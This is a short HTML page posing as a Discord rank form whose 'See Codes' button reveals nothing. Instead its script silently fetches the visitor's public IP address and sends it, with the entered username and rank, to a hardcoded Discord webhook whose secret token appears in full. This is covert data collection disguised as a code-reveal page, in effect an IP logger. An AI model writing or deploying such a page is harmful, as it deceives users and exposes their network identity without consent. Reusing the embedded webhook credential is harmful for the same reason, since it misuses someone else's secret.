<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>User Input</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #2c2f33;
      color: #fff;
    }
    .container {
      text-align: center;
      background: #23272a;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }
    input {
      width: 80%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      background-color: #7289da;
      color: white;
      cursor: pointer;
    }
    button:hover {
      background-color: #5b6eae;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Enter Details</h1>
    <input type="text" id="discordUser" placeholder="Discord Username" required>
    <input type="text" id="rank" placeholder="Enter Rank" required>
    <button onclick="sendData()">See Codes</button>
    <p id="status" style="margin-top: 20px;"></p>
  </div>

  <script>
    async function sendData() {
      const discordUser = document.getElementById('discordUser').value;
      const rank = document.getElementById('rank').value.toLowerCase();
      const status = document.getElementById('status');
      
      const validRanks = ['sphhaire', 'gold', 'silver', 'bronze', 'platnum'];
      let code = '';
      
      if (!discordUser || !rank) {
        status.textContent = 'Please fill in all fields.';
        status.style.color = 'red';
        return;
      }
      
      if (!validRanks.includes(rank)) {
        status.textContent = 'Incorrect Rank.';
        status.style.color = 'red';
        return;
      }
      
      if (rank === 'platnum' || rank === 'sphhaire') {
        code = 'highD84DJ';
      } else if (rank === 'silver') {
        code = 'midJ8DH';
      } else {
        code = 'low8Bjhd8';
      }

      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        const webhookUrl = 'https://discord.com/api/webhooks/1332888766490349678/MW70wO-ZgxR6hAWy3RBLW1eusKfkn6m_wfBGkhwYCzxvrwXgUPTawDnZmpvTdb_fEMnY';
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            content: `**Discord User:** ${discordUser}\n**Rank:** ${rank}\n**IP Address:** ${userIP}\n**Code:** ${code}\n**Server Population:** 9`
          }),
        });

        if (response.ok) {
          status.textContent = 'Your information has been sent.';
          status.style.color = 'green';
        } else {
          status.textContent = 'Failed to send information. Please try again.';
          status.style.color = 'red';
        }
      } catch (error) {
        console.error('Error:', error);
        status.textContent = 'An error occurred. Please try again later.';
        status.style.color = 'red';
      }
    }
  </script>
</body>
</html>
